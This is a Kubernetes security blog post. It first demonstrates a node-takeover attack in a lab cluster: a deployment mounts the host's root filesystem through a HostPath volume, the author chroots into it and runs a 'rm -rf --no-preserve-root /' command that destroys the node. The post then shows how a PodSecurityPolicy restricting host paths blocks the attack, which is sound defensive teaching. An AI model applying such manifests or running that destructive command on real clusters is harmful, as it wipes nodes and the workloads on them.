+++
author = "Suraj Deshmukh"
title = "HostPath volumes and it's problems"
description = "Kubernetes HostPath volume good way to nuke your Kubernetes Nodes"
date = "2018-09-10T01:00:51+05:30"
categories = ["kubernetes", "openshift"]
tags = ["kubernetes", "openshift", "hostpath", "security"]
+++

This post will demonstrate how Kubernetes [`HostPath`](https://kubernetes.io/docs/concepts/storage/volumes/#hostpath) volumes can help you get access to the Kubernetes nodes. Atleast you can play with the filesystem of the node on which you pod is scheduled on. You can get access to other containers running on the host, certificates of the kubelet, etc.

I have a 3-master and 3-node cluster and setup using [this script](https://github.com/kinvolk/kubernetes-the-hard-way-vagrant/blob/master/scripts/setup), running in a Vagrant environment.

All the nodes are in ready state:

```bash
$ kubectl get nodes -o wide
NAME       STATUS    ROLES     AGE       VERSION   INTERNAL-IP      EXTERNAL-IP   OS-IMAGE             KERNEL-VERSION      CONTAINER-RUNTIME
worker-0   Ready     <none>    24m       v1.11.2   192.168.199.20   <none>        Ubuntu 18.04.1 LTS   4.15.0-33-generic   cri-o://1.11.2
worker-1   Ready     <none>    23m       v1.11.2   192.168.199.21   <none>        Ubuntu 18.04.1 LTS   4.15.0-33-generic   cri-o://1.11.2
worker-2   Ready     <none>    21m       v1.11.2   192.168.199.22   <none>        Ubuntu 18.04.1 LTS   4.15.0-33-generic   cri-o://1.11.2
```

The deployment looks like this:

```yaml
$ cat deployment.yaml 
apiVersion: apps/v1beta1
kind: Deployment
metadata:
  labels:
    run: web
  name: web
spec:
  replicas: 1
  selector:
    matchLabels:
      run: web
  template:
    metadata:
      labels:
        run: web
    spec:
      containers:
      - image: centos/httpd
        name: web
        volumeMounts:
        - mountPath: /web
          name: test-volume
      volumes:
      - name: test-volume
        hostPath:
          path: /
```

Above you can see we are mounting `/` of the host inside pod at `/web`. This is our gateway to host's file system. Let's deploy this:

```bash
$ kubectl apply -f deployment.yaml
deployment.apps/web created
```

And now that pod has started:

```bash
$ kubectl get pods -o wide
NAME                   READY     STATUS    RESTARTS   AGE       IP          NODE       NOMINATED NODE
web-66cdf67bbc-44zhj   1/1       Running   0          4m        10.38.0.1   worker-2   <none>
```

Getting inside the pod and checking out the mounted directory:

```bash
$ kubectl exec -it web-66cdf67bbc-44zhj bash
[root@web-66cdf67bbc-44zhj /]# cd /web
[root@web-66cdf67bbc-44zhj web]# ls
bin  boot  dev  etc  home  initrd.img  initrd.img.old  lib  lib64  lost+found  media  mnt  opt  proc  root  run  sbin  snap  srv  sys  tmp  usr  vagrant  var  vmlinuz  vmlinuz.old
```

Now we can either `chroot` into this and see the output of `ps`.

```bash
[root@web-66cdf67bbc-44zhj ~]# chroot /web
# ps aufx
USER       PID %CPU %MEM    VSZ   RSS TTY      STAT START   TIME COMMAND
root         2  0.0  0.0      0     0 ?        S    05:15   0:00 [kthreadd]
root         4  0.0  0.0      0     0 ?        I<   05:15   0:00  \_ [kworker/0:0H]
root         6  0.0  0.0      0     0 ?        I<   05:15   0:00  \_ [mm_percpu_wq]
root         7  0.0  0.0      0     0 ?        S    05:15   0:00  \_ [ksoftirqd/0]
root         8  0.0  0.0      0     0 ?        I    05:15   0:00  \_ [rcu_sched]
root         9  0.0  0.0      0     0 ?        I    05:15   0:00  \_ [rcu_bh]
root        10  0.0  0.0      0     0 ?        S    05:15   0:00  \_ [migration/0]
root        11  0.0  0.0      0     0 ?        S    05:15   0:00  \_ [watchdog/0]
root        12  0.0  0.0      0     0 ?        S    05:15   0:00  \_ [cpuhp/0]
```

Or you can just delete the entire `root`, a.k.a. nuking the node.

```bash
# rm -rf --no-preserve-root /
```

Now if you look at the nodes:

```bash
$ kubectl get nodes -o wide
NAME       STATUS     ROLES     AGE       VERSION   INTERNAL-IP      EXTERNAL-IP   OS-IMAGE             KERNEL-VERSION      CONTAINER-RUNTIME
worker-0   Ready      <none>    30m       v1.11.2   192.168.199.20   <none>        Ubuntu 18.04.1 LTS   4.15.0-33-generic   cri-o://1.11.2
worker-1   Ready      <none>    29m       v1.11.2   192.168.199.21   <none>        Ubuntu 18.04.1 LTS   4.15.0-33-generic   cri-o://1.11.2
worker-2   NotReady   <none>    27m       v1.11.2   192.168.199.22   <none>        Unknown              4.15.0-33-generic   cri-o://Unknown
```

The last node `worker-2` is in `NotReady` state. We have successfully made one node unusable. Now that one node is gone your pod will be scheduled on another node, where you can do similar stuff.

```bash
$ kubectl get pods -o wide
NAME                   READY     STATUS    RESTARTS   AGE       IP          NODE       NOMINATED NODE
web-66cdf67bbc-44zhj   0/1       Unknown   0          20m       10.38.0.1   worker-2   <none>
web-66cdf67bbc-b22xn   1/1       Running   0          8m        10.32.0.2   worker-0   <none>
```

As you can see above the pod is re-scheduled on node `worker-0`. And we can do same set of steps to make `worker-0` unusable.

Deleting the deployment to cleanup.

```bash
$ kubectl delete deployment web
deployment.extensions "web" deleted
```

# Stopping this attack using PodSecurityPolicy


Now as a cluster admin how can you prevent this from happening? You can create something called as [`PodSecurityPolicy`](https://kubernetes.io/docs/concepts/policy/pod-security-policy/). This let's you define what kind of pods be created. Or what permissions pod can request.

Here is an example `PodSecurityPolicy`:

```yaml
$ cat podsecuritypolicy.yaml 
apiVersion: policy/v1beta1
kind: PodSecurityPolicy
metadata:
  name: example
spec:
  seLinux:
    rule: RunAsAny
  supplementalGroups:
    rule: RunAsAny
  runAsUser:
    rule: RunAsAny
  fsGroup:
    rule: RunAsAny
  volumes:
  - '*'
  privileged: false  # Don't allow privileged pods!
  allowedHostPaths:
  - pathPrefix: /foo
    readOnly: true
```

In above example, we are restricting access to `hostPath` a pod can request. Here the path that is allowed is `/foo` and has `readOnly` access to the underlying file system.

Create `PodSecurityPolicy` using above file:

```bash
$ kubectl apply -f podsecuritypolicy.yaml 
podsecuritypolicy.policy/example created
```

To enable this policy we need to create few more objects, a `Role` and `RoleBinding`.

`Role`:

```yaml
$ cat role.yaml 
kind: Role
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: authorize-hostpath
rules:
- apiGroups: ['policy']
  resources: ['podsecuritypolicies']
  verbs:     ['use']
  resourceNames:
  - example
```

This `Role` will allow usage of policy that we created above.

Create `Role`:

```bash
$ kubectl apply -f role.yaml 
role.rbac.authorization.k8s.io/authorize-hostpath created
```

`RoleBinding`:

```yaml
$ cat rolebinding.yaml 
kind: RoleBinding
apiVersion: rbac.authorization.k8s.io/v1
metadata:
  name: auth-hostpath
roleRef:
  kind: Role
  name: authorize-hostpath
  apiGroup: rbac.authorization.k8s.io
subjects:

# Authorize all service accounts in a namespace:
- kind: Group
  apiGroup: rbac.authorization.k8s.io
  name: system:serviceaccounts
```

This `RoleBinding` will bind the `Role` above and all the `ServiceAccounts` in current namespace.

Create `RoleBinding`:

```bash
$ kubectl create -f rolebinding.yaml 
rolebinding.rbac.authorization.k8s.io/auth-hostpath created
```

Now that we have required permissions in place, try to re-create the `deployment`:

```bash
$ kubectl apply -f deployment.yaml 
deployment.apps/web created
```

The pod is not created and in events you can see an error as `Error creating: pods "web-66cdf67bbc-" is forbidden: unable to validate against any pod security policy: [spec.volumes[0].hostPath.pathPrefix: Invalid value: "/": is not allowed to be used]`:

```bash
$ kubectl get events 
LAST SEEN   FIRST SEEN   COUNT     NAME                              KIND         SUBOBJECT   TYPE      REASON                    SOURCE                  MESSAGE
...
6s          17s          12        web-66cdf67bbc.15530e83fd4f8592   ReplicaSet               Warning   FailedCreate              replicaset-controller   Error creating: pods "web-66cdf67bbc-" is forbidden: unable to validate against any pod security policy: [spec.volumes[0].hostPath.pathPrefix: Invalid value: "/": is not allowed to be used]
```

This error is due to the fact that we have allowed `hostPath` to be only under `/foo` and in the original file it is set to `/`.

Now change in `deployment.yaml` file at path `deployment.spec.template.spec.volumes[0].hostPath.path` from `/` to `/foo` and apply again:

```bash
$ kubectl apply -f deployment.yaml 
deployment.apps/web configured
```

You can see another error `Error creating: pods "web-85cb548b47-" is forbidden: unable to validate against any pod security policy: [spec.containers[0].volumeMounts[0].readOnly: Invalid value: false: must be read-only]`:

```bash
$ kubectl get events 
LAST SEEN   FIRST SEEN   COUNT     NAME                              KIND         SUBOBJECT   TYPE      REASON                    SOURCE                  MESSAGE
...
5s          15s          12        web-85cb548b47.15530eb0c27c6122   ReplicaSet               Warning   FailedCreate              replicaset-controller   Error creating: pods "web-85cb548b47-" is forbidden: unable to validate against any pod security policy: [spec.containers[0].volumeMounts[0].readOnly: Invalid value: false: must be read-only]
```

This is because in the `volumeMount`'s `readOnly` we have used in container has no value defined, which means it defaults to `false` and in `PodSecurityPolicy` we have defaulted the `hostPath` to be `readOnly`.

So change `deployment.spec.template.spec.containers[0].volumeMounts[0].readOnly` to `true`. And manifest should look like following:

```yaml
$ cat deployment.yaml 
apiVersion: apps/v1beta1
kind: Deployment
metadata:
  labels:
    run: web
  name: web
spec:
  replicas: 1
  selector:
    matchLabels:
      run: web
  template:
    metadata:
      labels:
        run: web
    spec:
      containers:
      - image: centos/httpd
        name: web
        volumeMounts:
        - mountPath: /web
          name: test-volume
          readOnly: true
      volumes:
      - name: test-volume
        hostPath:
          path: /foo
```

Now if you re-deploy the app:

```bash
$ kubectl apply -f deployment.yaml 
deployment.apps/web configured
```

The pod is scheduled and created:

```bash
$ kubectl get pods
NAME                   READY     STATUS    RESTARTS   AGE
web-7b77459d6b-kbqm8   1/1       Running   0          7s
```

Now if you exec into this pod and try to do something, you can see nothing happens:

```bash
$ kubectl exec -it web-7b77459d6b-kbqm8 bash
[root@web-7b77459d6b-kbqm8 /]# cd /web/
[root@web-7b77459d6b-kbqm8 web]# ls
[root@web-7b77459d6b-kbqm8 web]# touch file.txt
touch: cannot touch 'file.txt': Read-only file system
```

So this is really good feature you can use to stop someone from nuking your cluster.
